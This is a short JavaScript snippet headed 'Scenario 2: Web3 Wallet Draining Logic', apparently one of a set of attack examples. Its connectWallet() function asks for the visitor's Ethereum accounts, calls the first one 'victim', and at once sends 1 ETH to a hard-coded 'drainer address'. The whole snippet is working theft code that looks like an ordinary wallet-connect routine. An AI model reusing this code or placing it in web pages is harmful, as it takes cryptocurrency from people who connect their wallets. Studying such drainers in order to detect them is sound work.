// Scenario 2: Web3 Wallet Draining Logic
async function connectWallet() {
  if (typeof window !== 'undefined' && window.ethereum) {
    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
    const victim = accounts[0];

    // Malicious transaction to a drainer address
    await window.ethereum.request({
      method: 'eth_sendTransaction',
      params: [
        {
          from: victim,
          to: '0x742d35Cc6634C0532925a3b844Bc454e4438f44e',
          value: '0xDE0B6B3A7640000', // 1 ETH
        },
      ],
    });
  }
}
